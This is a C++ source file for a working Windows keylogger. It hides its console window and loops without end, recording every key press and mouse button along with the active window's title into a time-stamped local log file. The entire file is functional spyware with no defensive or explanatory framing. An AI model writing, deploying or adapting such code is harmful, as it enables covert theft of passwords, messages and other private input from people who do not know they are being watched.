#define FILEEXT ".log"
#define _WIN32_WINNT 0x0500

#include <cstdlib>
#include <iostream>
#include <bits/stdc++.h>
#include <sstream>
#include <fstream>
#include <ctime>
#include <windows.h>

using namespace std;
//akashravi.tk

string intToString(int);
string getCurrDir();
string getSelfPath();
string dirBasename(string);

int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPTSTR lpCmdLine,int nCmdShow){

	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);   // Hide console window

	string basepath = dirBasename(getSelfPath());

	time_t rawtime;
	struct tm *timeinfo;
	time(&rawtime);
	timeinfo = localtime(&rawtime);
	char filename[MAX_PATH];
	char filepath[MAX_PATH];
	strftime(filename, 100, "%Y-%m-%d_%H-%M-%S", timeinfo);
	sprintf(filepath, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);


	string lastTitle = "";
	ofstream klogout(filepath);

	SHORT lastc = 0;
    while(1){
		Sleep(2); // Give other programs time to run

		// Get the active windowtitle
		char title[1024];
		HWND hwndHandle = GetForegroundWindow();
		GetWindowText(hwndHandle, title, 1023);
		if(lastTitle != title){
			klogout << endl << endl << "Window: ";
			if(strlen(title) == 0)
				klogout << "NO ACTIVE WINDOW";
			else
				klogout << "'" << title << "'";

			klogout << endl;

			lastTitle = title;
		}

		// Logging Keys
		for(unsigned char c = 1; c < 255; c++){
			SHORT rv = GetAsyncKeyState(c);
		    if(rv & 1){ // On Press Button Down
		    	string out = "";
		    	if(c == 1)
		    		out = "[LMOUSE]"; // Mouse Left
		    	else if(c == 2)
		    		out = "[RMOUSE]"; // Mouse Right
		    	else if(c == 4)
		    		out = "[MMOUSE]"; // Mouse Middle
		    	else if(c == 13)
		    		out = "[RETURN]";
		    	else if(c == 16 || c == 17 || c == 18)
		    		out = "";
		    	else if(c == 160 || c == 161) // lastc == 16
		    		out = "[SHIFT]";
		    	else if(c == 162 || c == 163) // lastc == 17
		    		out = "[STRG]";
		    	else if(c == 164) // lastc == 18
		    		out = "[ALT]";
		    	else if(c == 165)
		    		out = "[ALT GR]";
		    	else if(c == 8)
		    		out = "[BACKSPACE]";
		    	else if(c == 9)
		    		out = "[TAB]";
		    	else if(c == 27)
		    		out = "[ESC]";
	    		else if(c == 33)
		    		out = "[PAGE UP]";
		    	else if(c == 34)
		    		out = "[PAGE DOWN]";
		    	else if(c == 35)
		    		out = "[HOME]";
		    	else if(c == 36)
		    		out = "[POS1]";
		    	else if(c == 37)
		    		out = "[ARROW LEFT]";
		    	else if(c == 38)
		    		out = "[ARROW UP]";
		    	else if(c == 39)
		    		out = "[ARROW RIGHT]";
		    	else if(c == 40)
		    		out = "[ARROW DOWN]";
		    	else if(c == 45)
		    		out = "[INS]";
		    	else if(c == 46)
		    		out = "[DEL]";
		    	else if(c >= 65 && c <= 90 || c >= 48 && c <= 57 || c == 32)
		    		out = c;

		    	else if(c == 91 || c == 92)
		    		out = "[WIN]";
		    	else if(c >= 96 && c <= 105)
		    		out = "[NUM " + intToString(c - 96) + "]";
		    	else if(c == 106)
		    		out = "[NUM /]";
		    	else if(c == 107)
		    		out = "[NUM +]";
		    	else if(c == 109)
		    		out = "[NUM -]";
		    	else if(c == 109)
		    		out = "[NUM ,]";
		    	else if(c >= 112 && c <= 123)
		    		out = "[F" + intToString(c - 111) + "]";
		    	else if(c == 144)
		    		out = "[NUM]";
		    	else if(c == 192)
		    		out = "[OE]";
		    	else if(c == 222)
		    		out = "[AE]";
		    	else if(c == 186)
		    		out = "[UE]";
		    	else if(c == 186)
		    		out = "+";
		    	else if(c == 188)
		    		out = ",";
		    	else if(c == 189)
		    		out = "-";
		    	else if(c == 190)
		    		out = ".";
		    	else if(c == 191)
		    		out = "#";
		    	else if(c == 226)
		    		out = "<";

		    	else
			    	out = "[KEY \\" + intToString(c) + "]";

			    klogout << out;
			    klogout.flush();

		    	lastc = c;
			}
		}
	}

	klogout.close();

    return 0;
}

string intToString(int i){
	stringstream out;
	out << "" << i;
	return out.str();
}

string getCurrDir(){
	string rv = "";

	char *curdir = new char[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, curdir);
	rv = curdir;
	delete[] curdir;

	return rv;
}

string getSelfPath(){
	char selfpath[MAX_PATH];
	GetModuleFileName(NULL, selfpath, MAX_PATH);
	return selfpath;
}

string dirBasename(string path){

	if(path.empty())
		return "";

	if(path.find("\\") == string::npos)
		return path;

	if(path.substr(path.size() - 1) == "\\")
		path = path.substr(0, path.size() - 1);

	size_t pos = path.find_last_of("\\");
	if(pos != string::npos)
		path = path.substr(0, pos);

	if(path.substr(path.size() - 1) == "\\")
		path = path.substr(0, path.size() - 1);

	return path;
}
